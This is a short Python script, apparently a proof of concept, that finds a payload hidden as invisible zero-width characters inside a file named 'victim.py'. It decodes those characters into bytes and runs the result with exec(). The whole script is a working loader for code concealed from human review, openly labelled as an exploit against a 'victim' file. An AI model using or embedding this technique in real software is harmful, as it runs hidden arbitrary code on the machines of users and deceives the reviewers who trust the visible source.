from pathlib import Path
import binascii

def bitstring_to_bytes(encoded_exploit):
    exploit2int = int(encoded_exploit, 2)
    byte_array = bytearray()
    while exploit2int:
        byte_array.append(exploit2int & 0xff)
        exploit2int >>= 8
    return bytes(byte_array[::-1])

ENCODED_EXPLOIT = ""
VICTIM = Path("victim.py")
BITS_TO_SEPARATE=8
HEADER = "\u200B\u200B\u200B\u200B\u200B\u200B\u200B\u200B"
FOOTER = "\u200C\u200C\u200C\u200C\u200C\u200C\u200C\u200C"

with open(VICTIM, "r+", encoding="utf8") as file:
    file = file.read()
    for character in file:
        ENCODED_EXPLOIT += character
        if ENCODED_EXPLOIT.endswith(HEADER):
            ENCODED_EXPLOIT = ENCODED_EXPLOIT[-8:]
        if ENCODED_EXPLOIT.endswith(FOOTER):
            break

# convert zero width spaces to binary
for character in ENCODED_EXPLOIT:
    if character == "\u200B":
        ENCODED_EXPLOIT = ENCODED_EXPLOIT.replace(character, "1")
    elif character == "\u200C":
        ENCODED_EXPLOIT = ENCODED_EXPLOIT.replace(character, "0")

ENCODED_EXPLOIT = ENCODED_EXPLOIT[8:-8]
exec(bitstring_to_bytes(ENCODED_EXPLOIT))